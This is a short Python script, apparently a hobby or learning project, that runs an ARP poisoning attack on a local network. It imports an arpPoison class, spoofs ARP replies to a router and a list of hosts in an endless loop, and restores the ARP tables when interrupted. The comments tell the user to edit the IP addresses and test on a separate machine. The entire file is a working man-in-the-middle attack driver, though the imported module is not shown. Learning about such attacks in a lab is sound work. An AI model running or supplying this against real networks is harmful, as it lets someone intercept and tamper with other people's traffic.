from arp import arpPoison

# Need a seperate machine to test this attack on.
# Alter IP addresses to meet your own.
# Check arp table (Windows: "arp -a", Linux: "arp")

ipaddrs = ("192.168.1.116", "192.168.1.106")

a = arpPoison("192.168.1.1", "192.168.1.116", ipaddrs)

a.initialSetup()
try:
    print("[-] Starting attack")
    while True:
        # For single host:
        # Need both as it sends the spoofed ARP packets to both the router and endpoint
        #a.poisonHost()
        #a.poisonRouter()

        # For multi-host:
        a.poisonListOfHosts()
except KeyboardInterrupt:
    # Single host
    #a.arpTableRestore()

    # Multi-host
    a.arpMultipleTableRestore()
    exit()
